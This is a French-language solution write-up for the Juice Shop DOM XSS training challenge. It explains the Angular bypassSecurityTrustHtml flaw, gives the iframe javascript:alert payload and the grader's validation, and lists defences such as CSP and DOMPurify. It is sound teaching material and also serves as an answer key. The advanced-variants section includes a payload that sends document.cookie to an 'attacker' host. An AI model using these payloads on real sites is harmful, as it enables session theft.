# Solution canonique - localXssChallenge : DOM XSS

## Contexte

Le champ de recherche en haut de la page Juice Shop accepte une chaine
qui est ensuite affichee comme intitule des resultats (par exemple
"Search Results - foo"). Le frontend Angular insere cette chaine dans le
DOM en utilisant la methode `bypassSecurityTrustHtml` du DomSanitizer,
ce qui dit explicitement a Angular de NE PAS echapper le contenu. Toute
balise HTML soumise est donc rendue comme du HTML executable.

## Vulnerabilite exploitee

DOM-Based Cross-Site Scripting (DOM XSS). OWASP Top 10 2021 : A03:2021
Injection. CWE-79 Improper Neutralization of Input During Web Page
Generation. CWE-87 CRLF Injection (variante).

Le code Angular cible (composant search-result) :

```typescript
this.searchValue = this.sanitizer.bypassSecurityTrustHtml(
  this.searchValue as string
)
```

Le `bypassSecurityTrustHtml` est concu pour une utilisation tres
controlee (HTML statique provenant d'une source de confiance). Ici il
est applique a un parametre utilisateur, ce qui est exactement
l'anti-pattern documente dans la documentation Angular elle-meme.

## Etapes de resolution

1. **Etape 1 - Identifier le champ de recherche** : la loupe en haut de
   page Juice Shop, qui ouvre un champ texte.

2. **Etape 2 - Probe de detection** : taper `<h1>test</h1>` dans le
   champ et appuyer sur Entree. Si "test" apparait en grande taille
   au-dessus des resultats, le HTML est interprete : le DOM XSS est
   confirme.

3. **Etape 3 - Construire le payload alert** : utiliser un iframe avec
   src=javascript: comme demande par la description du challenge :
   ```html
   <iframe src="javascript:alert(`xss`)">
   ```
   Le contenu de l'alert est `xss` entre backticks (les apostrophes et
   double-quotes seraient mal rendues dans l'URL hash).

4. **Etape 4 - Soumettre** : coller exactement
   `<iframe src="javascript:alert(`xss`)">` dans le champ de recherche
   et appuyer sur Entree.

5. **Etape 5 - Observer** : une popup `xss` s'affiche. L'iframe
   javascript: a ete execute dans le contexte de la page.

6. **Etape 6 - Validation** : Juice Shop detecte le payload exact
   `<iframe src="javascript:alert(`xss`)">` dans le parametre de
   recherche et marque le challenge solved.

## Validation automatique

Le backend Juice Shop intercepte la query string `q=` et compare son
contenu a une regex de detection du payload de challenge. Si la regex
match, `localXssChallenge` est marque solved=true.

## Concept enseigne

Sanitization vs escaping : le bon pattern par defaut est d'echapper tout
contenu utilisateur (Angular le fait automatiquement avec `{{ }}` et
`[textContent]`). Les overrides comme `bypassSecurityTrustHtml`,
`innerHTML`, `dangerouslySetInnerHTML` (React) sont des armes a feu : a
n'utiliser que sur du contenu STATIQUE, jamais sur des donnees
utilisateur.

Concept secondaire : DOM XSS vs Reflected XSS. Le DOM XSS s'execute
entierement cote client (ta saisie est traitee par du JS qui modifie
le DOM). Le Reflected XSS implique un aller-retour au serveur. La
detection est differente : un proxy serveur ne voit pas DOM XSS, mais le
parametre URL est present pour Reflected XSS.

## Prevention

1. **Echappement par defaut, override exceptionnel** : Angular echappe
   le HTML par defaut via `[textContent]` ou `{{ }}`. N'utiliser
   `[innerHTML]` ou `bypassSecurityTrustHtml` qu'apres revue manuelle
   AVEC documentation justificative.

2. **CSP (Content Security Policy) stricte** : un header CSP qui
   interdit `script-src 'unsafe-inline'` et `'unsafe-eval'` casse la
   plupart des payloads XSS, meme en presence de la vulnerabilite. Voir
   le challenge CSP Bypass de Juice Shop pour comprendre les limites.

3. **Sanitization (et pas escaping) quand on doit accepter du HTML** :
   pour les editeurs WYSIWYG, utiliser DOMPurify ou
   sanitize-html cote serveur (pas seulement client). Conserver une
   liste blanche etroite de tags + attributs.

4. **Trusted Types (Chrome/Edge moderne)** : un mecanisme browser-side
   qui force les API DOM dangereuses a accepter uniquement des objets
   typeS comme TrustedHTML, jamais des strings brutes.

## Variantes pour etudiants avances

- Construire le payload directement via l'URL (DOM XSS contournant le
  champ visuel) :
  `http://127.0.0.1:3000/#/search?q=<iframe src="javascript:alert(`xss`)">`
- Tester si une CSP est presente sur Juice Shop :
  `curl -I http://127.0.0.1:3000/ | grep -i content-security-policy`
- Tester d'autres payloads pour exfiltrer des donnees :
  `<img src=x onerror="fetch('//attacker/?'+document.cookie)">`. Discuter
  des limites (httpOnly cookies, SameSite, CORS).
- Discussion : pourquoi `bypassSecurityTrustHtml` existe-t-il dans
  Angular si c'est dangereux ? (legitimite : afficher du HTML serialise
  par un editeur de confiance, avec sanitization en amont).
